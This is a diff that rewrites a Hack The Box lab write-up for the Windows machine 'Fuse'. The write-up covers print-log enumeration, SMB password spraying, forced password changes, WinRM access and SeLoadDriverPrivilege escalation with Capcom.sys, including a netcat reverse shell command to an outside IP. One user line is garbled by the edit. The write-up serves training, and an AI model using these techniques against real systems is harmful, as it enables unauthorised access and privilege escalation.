@@ -6,18 +6,18 @@ points: 30
 rating: 3.6
 date: 2020-06-13
 avatar: assets/htb/fuse.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Fuse
 ---
+
 ## Overview
 
-This medium-difficulty Windows machine gave me a chance to exploit a vulnerable service that we hear of often in training as being an overlooked problem for many Enterprises: printer management.  While this challenge did not involve exploiting an actual print spooler service, it drew attention to the problems that misconfigurations can cause especially when dealing with credentialed service accounts.
+This medium Windows box let me go after a service that training material constantly flags as a blind spot for many enterprises: printer management.  No actual print spooler exploit was involved here, but the box did highlight how dangerous misconfigurations can be, particularly when credentialed service accounts are in the mix.
 
-You may see me using Metasploit more starting from this machine. I recently went through a class where we used it quite a bit, so I learned that it isn't as bad as I thought and can even help workflow in some cases. I am probably still going to avoid easy-button exploits unless crunched for time \(always depending on what is available!\). It's about the learning journey, not the end result of capturing the flags.
+Starting with this box you'll notice I lean on Metasploit a bit more. A recent class I took used it heavily, which showed me it isn't as bad as I'd assumed and can actually streamline some workflows. I'll still steer clear of push-button exploits unless I'm short on time \(and depending on what's available!\). The point is the learning, not just grabbing flags.
 
 ## Useful Skills and Tools
 
-For this machine I tried using the Three Ms \(tm\) a bit more than usual, to somewhat mixed success.
+On this box I made more use than usual of the Three Ms \(tm\), with mixed results.
 
 * Metasploit
 * msfvenom
@@ -27,7 +27,7 @@ For this machine I tried using the Three Ms \(tm\) a bit more than usual, to som
 
 #### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration with an nmap scan of `<YOUR_IP>`. The flags I rely on routinely are: `-p-`, a shorthand that scans every port, `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the host, `-sV` for a service scan, and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -101,19 +101,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 410.91 seconds
 ```
 
-This machine had many ports open. From the ports and services that were open this appeared to be a domain controller running Windows Server 2016.
+Plenty of ports were open. Based on the exposed ports and services, this looked like a domain controller running Windows Server 2016.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-papercut.png)
+![](assets/wu/fuse/img-1.png)
 
-Navigating to port 80 redirected me to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm).  I had to add `fuse.fabricorp.local` to my local hosts file to proceed.  I was greeted by a PaperCut print logger site, without any authentication protecting it. I clicked on view HTML for each of the print history pages to see what kind of documents had been printed recently.
+Hitting port 80 redirected me to [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm).  To get there I had to add `fuse.fabricorp.local` to my local hosts file.  What loaded was a PaperCut print logger site with no authentication at all. I opened the view HTML link for each print history page to see what had recently been printed.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-29may.png)
+![](assets/wu/fuse/img-2.png)
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-30may%2520%25281%2529%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-10jun.png)
+![](assets/wu/fuse/img-4.png)
 
-Each of the three pages contained potential usernames and client computer names in the print history and a number of interesting sounding document titles.
+All three pages held likely usernames and client machine names in the print history, along with several intriguing document titles.
 
 ```text
 Time        User        Pages    Copies    Printer        Document                        Client    Duplex    Grayscale
@@ -131,7 +131,7 @@ Print Logs - 10 Jun 2020
 19:18:17     administrator     1     1     HP-MFT01     printing_issue_test - Notepad LETTER, 16kb, PCL6     FUSE     No     Yes
 ```
 
-I found six potential usernames \(including `bnielson` in one of the document titles. The document title `Fabricorp01.docx` also stuck out to me as looking like the perfect type of thing that corporate users would likely use as a password.  
+That gave me six possible usernames \(including `bnielson`, which showed up in one of the document titles. The title `Fabricorp01.docx` also jumped out at me as exactly the kind of string corporate users tend to reuse as a password.  
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
@@ -160,22 +160,22 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] Auxiliary module execution complete
 ```
 
-Unfortunately these users all had Kerberos pre-authentication enabled, but I was able to confirm that all of them were valid usernames.
+All of these users had Kerberos pre-authentication enabled, unfortunately, but the check did confirm that every one of them was a valid username.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-papercut-about.png)
+![](assets/wu/fuse/img-5.png)
 
-At first I started chasing the little white rabbit while doing research about this PaperCut service.  
+Initially I went down a rabbit hole researching this PaperCut service.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-deleted-files.png)
+![](assets/wu/fuse/img-6.png)
 
-I managed to find some interesting results that looked like a potential way to retrieve printed documents through backups, but either I did not have the proper privileges, or these options were not active on this site. 
+I turned up some promising leads about pulling printed documents from backups, but either I lacked the necessary privileges or those features simply weren't enabled on this site. 
 
 * [https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData\#restore-from-a-backup-on-to-a-test-server](https://www.papercut.com/kb/Main/RetrieveDeletedUserPrintData#restore-from-a-backup-on-to-a-test-server)
 * [https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html](https://www.papercut.com/support/resources/manuals/ng-mf/common/topics/sys-backups.html)
 * \[app-path\]\server\data\backups
 * [https://nvd.nist.gov/vuln/detail/CVE-2019-8948](https://nvd.nist.gov/vuln/detail/CVE-2019-8948)
 
-After exhausting those possibilities, I went back and tried to do a good ol' brute force enumeration using the valid usernames I had found and the potential password I had spotted.
+Once those avenues dried up, I circled back to a plain brute-force attempt using the valid usernames I'd gathered and the candidate password I'd noticed.
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > search type:auxiliary smb
@@ -242,7 +242,7 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-After running the `smb_login` scanner I found that not only had one person used this as their password, but three people had!
+Running the `smb_login` scanner revealed that this wasn't just one person's password, but three people's!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -261,7 +261,7 @@ Enter FABRICORP\bhult's password:
 session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
 ```
 
-However, I got an interesting error back when trying to enumerate open shares for these three users: `NT_STATUS_PASSWORD_MUST_CHANGE`.  I looked this up and found out that this meant that the user's passwords had expired and would have to be changed before they could log in.  Next, I did some research on changing SMB login passwords remotely from a Linux command line.
+When I tried to list open shares for these three users, though, I hit a curious error: `NT_STATUS_PASSWORD_MUST_CHANGE`.  Looking it up, I learned it meant the passwords had expired and needed to be reset before login would work.  So I went looking for a way to change SMB passwords remotely from a Linux command line.
 
 [https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password](https://samba.samba.narkive.com/I0oDpMEz/smbclient-says-nt-status-password-must-change-how-to-change-password)
 
@@ -286,7 +286,7 @@ However, I got an interesting error back when trying to enumerate open shares fo
            read-only copy of the user account database and will not allow the password change).
 ```
 
-I checked the man page for `smbpasswd` to see what the `-r` and `-U` options did, and found out that that these flags let me specify a remote host \(`-r`\) and username \(`U`\). 
+I read the `smbpasswd` man page to understand the `-r` and `-U` options, and learned they let me point at a remote host \(`-r`\) and a username \(`U`\). 
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -297,11 +297,9 @@ Retype new SMB password: test
 machine <YOUR_IP> rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
 ```
 
-I used this to try to change the password for `bnielson`, but it seemed as if there were some sort of password complexity rules in place. 
+I used this to attempt a password change for `bnielson`, but it looked like password complexity rules were being enforced. 
 
-{% hint style="info" %}
-The passwords will not show up on the screen like in my output above and below.  I added them to illustrate what I had done since the two code output boxes were identical without them!
-{% endhint %}
+The passwords don't actually echo to the screen the way they do in my output above and below.  I added them in so you can see what I typed, since otherwise the two code boxes would look identical!
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -312,11 +310,9 @@ Retype new SMB password: $Up3rC0mp13xP@$$w0rd
 Password changed for user bnielson
 ```
 
-After choosing a more complex password, I was able to change it successfully.
+Once I picked a sufficiently complex password, the change went through.
 
-{% hint style="info" %}
-If you change a user's password, and find that after a minute or so that your password isn't working, this is intended by the machine creator.  Especially on the free servers there may be a lot of people trying to exploit the machine at the same time, so this saves the trouble of a million machine resets. \(But it is still annoying if you don't know what's going on!\)
-{% endhint %}
+If you reset a user's password and find it stops working a minute or so later, that's by design from the box's creator.  On the free servers especially there can be many people attacking the box at once, so this avoids endless resets. \(Still annoying if you don't realize what's happening!\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -335,7 +331,7 @@ Enter WORKGROUP\bnielson's password:
 SMB1 disabled -- no workgroup available
 ```
 
-Next I used my new password for `bnielson` to enumerate open SMB shares. Besides the standard default shares, there were also a `HP-MFT01` and a `$print` share.
+With `bnielson`'s new password I then enumerated the open SMB shares. Alongside the usual default shares, there were `HP-MFT01` and `$print` shares.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -355,7 +351,7 @@ user:[pmerton] rid:[0x643]
 user:[svc-scan] rid:[0x645]
 user:[bhult] rid:[0x1bbd]
 user:[dandrews] rid:[0x1bbe]
-user:[mberbatov] rid:[0x1db1]
+user:berbatov] rid:[0x1db1]
 user:[astein] rid:[0x1db2]
 user:[dmuir] rid:[0x1db3]
 
@@ -547,7 +543,7 @@ rpcclient $> enumprinters
         comment:[]
 ```
 
-After enumerating the machine through RPC with `rpcclient` for awhile and finding a bunch of useful information, I hit the jackpot when checking for printers. In the description field someone had left a helpful note telling users where the printer was located, and also what the password was!
+After spending a while enumerating the box over RPC with `rpcclient` and collecting plenty of useful data, I struck gold when listing printers. Someone had left a helpful note in the description field giving the printer's location, and the password right along with it!
 
 ```text
 msf5 auxiliary(scanner/smb/smb_login) > run
@@ -605,13 +601,13 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [*] Auxiliary module execution completed
 ```
 
-Next I ran a brute force login attack against SMB after adding the new usernames and passwords to my lists.  I noticed that again there was more than one user sharing a password. Both `svc-print` and `svc-scan` service accounts used the same password.
+I added the new usernames and passwords to my lists and ran another SMB brute-force login attack.  Once again I saw more than one account sharing a password: both the `svc-print` and `svc-scan` service accounts used the same one.
 
 ## Initial Foothold
 
 #### Further enumeration
 
-I tried using the winrm enumeration module in metasploit, but for some reason it returned no valid logins. After playing around with different things for awhile trying to get something to work, the colored text in ZSH saved me. I noticed that the `$` in the password were being interpreted as a special character by the terminal. Once I wrapped the password in single quotes I was able to login using `evil-winrm`.
+I tried Metasploit's winrm enumeration module, but for whatever reason it reported no valid logins. After fiddling with various approaches, ZSH's colored output bailed me out: I spotted that the terminal was treating the `$` characters in the password as special. Wrapping the password in single quotes let me log in with `evil-winrm`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -676,7 +672,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : NativeCommandFailed
 ```
 
-`SeMachineAccountPrivilege` and `SeLoadDriverPrivilege` sounded like very interesting privileges.
+`SeMachineAccountPrivilege` and `SeLoadDriverPrivilege` both looked like very promising privileges.
 
 ### User.txt
 
@@ -713,7 +709,7 @@ Mode                LastWriteTime         Length Name
 cea5************************6553
 ```
 
-`tree` gave some odd looking output, but showed me that the `user.txt` proof was right there in my service account user's Desktop! \(Why a service account has a Desktop I am not sure...\)
+`tree` produced some strange-looking output, but it confirmed the `user.txt` proof was sitting right on my service account's Desktop! \(Why a service account even has a Desktop, I'm not sure...\)
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -773,7 +769,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
    1346      29    56524      76172       0.88   2568   0 wsmprovhost
 ```
 
-I checked running processes and didn't see anything too exciting.
+I reviewed the running processes and nothing jumped out as particularly interesting.
 
 ```text
 *Evil-WinRM* PS C:\users\svc-print\Desktop> services
@@ -793,11 +789,11 @@ C:\Windows\servicing\TrustedInstaller.exe                                       
 "C:\Program Files\Windows Defender\MsMpEng.exe"                                         True WinDefend
 ```
 
-Same with running services. I did notice that there was the print service for Papercut running, however.
+The running services were much the same, though I did spot the Papercut print service running.
 
 ### Exploiting SeLoadDriverPrivilege
 
-I decided that since the service account had the `SeLoadDriverPrivilege` privilege I would see if there were any published privilege escalation methods using it. I quickly found one at [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+Since the service account held the `SeLoadDriverPrivilege` privilege, I went looking for any published privesc techniques that abuse it. I quickly found one at [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/fuse]
@@ -870,7 +866,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 *Evil-WinRM* PS C:\Users\svc-print\Documents> Stop-Process -Name print
 ```
 
-First I tried to see if I could get a meterpreter shell by uploading a reverse shell I created using msfvenom.  I uploaded my malicious `print.exe`, ran it, and was given a meterpreter shell.  I backgrounded my shell to try to use the exploit `windows/local/capcom_sys_exec` which was related to the exploit in the article. 
+First I wanted to see whether I could land a meterpreter shell by uploading a reverse shell built with msfvenom.  I uploaded my malicious `print.exe`, executed it, and got a meterpreter session.  I backgrounded it so I could try the `windows/local/capcom_sys_exec` exploit, which relates to the one in the article. 
 
 ```text
 msf5 exploit(windows/local/capcom_sys_exec) > options
@@ -904,11 +900,11 @@ msf5 exploit(windows/local/capcom_sys_exec) > exploit
 [*] Exploit completed, but no session was created.
 ```
 
-Unfortunately no matter how I configured the options, metasploit did not seem to think this machine was vulnerable. Some reading lead me to [https://github.com/rapid7/metasploit-framework/pull/7363](https://github.com/rapid7/metasploit-framework/pull/7363) which explained why this didn't work:
+No matter how I set the options, Metasploit refused to believe the box was vulnerable. Some reading brought me to [https://github.com/rapid7/metasploit-framework/pull/7363](https://github.com/rapid7/metasploit-framework/pull/7363), which explained why it failed:
 
 > This module achieves local privilege escalation on a Windows target by exploiting a "feature" provided by the CAPCOM.SYS driver for Windows x64. The "feature" is the driver allows for user-land functions to be executed in the context of the kernel. Currently this module has only been tested with Windows 7, but should work on earlier Windows versions or any other version that doesn't have SMAP support.
 
- I decided to run the exploits in a more manual way, following the article I found earlier.
+ I opted to run the exploits manually instead, following the article I'd found earlier.
 
 ```text
 meterpreter > sysinfo
@@ -921,18 +917,18 @@ Logged On Users : 5
 Meterpreter     : x64/windows
 ```
 
-Using meterpreter's `sysinfo` command I was able to verify that this version of Windows was x64-based.
+Meterpreter's `sysinfo` command let me confirm this Windows build was x64.
 
 ### Getting a shell
 
-Going back to the article I found earlier, I found a few links to files needed for exploiting the `SeLoadDriverPrivilege` privilege.
+Returning to the earlier article, I found links to the files required to exploit the `SeLoadDriverPrivilege` privilege.
 
 * [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)
 * [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/exploit-capcom.png)
+![](assets/wu/fuse/img-7.png)
 
-Following the instructions, I had to compile the two files on Windows \(with a matching x64 architecture\).  I customized the exploit a bit to have it call a simple .bat script I wrote to send me a netcat reverse shell. The four files needed for this to work were:
+Per the instructions, I compiled the two files on Windows \(matching the x64 architecture\).  I tweaked the exploit so it would call a small .bat script I wrote that fires a netcat reverse shell back to me. The four files I needed were:
 
 1. Capcom.sys
 2. EOPLOADDRIVER.exe
@@ -943,7 +939,7 @@ Following the instructions, I had to compile the two files on Windows \(with a m
 C:\Windows\Temp\nc.exe 10.10.15.74 55541 -e cmd.exe
 ```
 
-I uploaded the four files required to `C:\temp` and tried to exploit the system, but for some reason I was not able to get back a shell.  It took me a bit of troubleshooting, but I managed to track down the \(very simple\) reason why.  
+I uploaded the four files to `C:\temp` and ran the exploit, but no shell came back for some reason.  After a bit of troubleshooting I pinned down the \(very simple\) cause.  
 
 ```text
 *Evil-WinRM* PS C:\temp> ./EOPLOADDRIVER.exe System\CurrentControlSet\printer C:\test\Capcom.sys
@@ -962,11 +958,11 @@ NTSTATUS: c000010e, WinError: 0
 [*] Press any key to exit this program
 ```
 
-I realized after compiling my exploits that I had accidentally written `C:\temp` in one file, and `C:\test` in the other. Luckily my user had permission to create these folders on the machine so it didn't turn out to be too much of an issue.  Next, I ran `EOPLOADDRIVER.exe` to create the registry key pointing to the malicious `capcom.sys` driver, then ran `ExploitCapcom.exe` to exploit this malicious driver to grant me a System shell.
+I realized after compiling that I'd mistakenly hardcoded `C:\temp` in one file and `C:\test` in the other. Fortunately my user could create those folders on the box, so it wasn't much of a problem.  I then ran `EOPLOADDRIVER.exe` to register the key pointing at the malicious `capcom.sys` driver, and ran `ExploitCapcom.exe` to abuse that driver and hand me a System shell.
 
 ### Root.txt
 
-After getting a System shell over netcat I once again uploaded my `print.exe` meterpreter reverse shell, and created a handler to catch it.  For some reason meterpreter failed to load despite the handler getting a call back, so I recompiled my exploit to use the standard Windows TCP reverse shell `windows/x64/shell_reverse_tcp`instead.  
+With a System shell over netcat in hand, I uploaded my `print.exe` meterpreter reverse shell again and set up a handler to catch it.  Meterpreter wouldn't load for some reason even though the handler got a callback, so I recompiled the exploit to use the plain Windows TCP reverse shell `windows/x64/shell_reverse_tcp` instead.  
 
 ```text
 msf5 exploit(multi/handler) > options
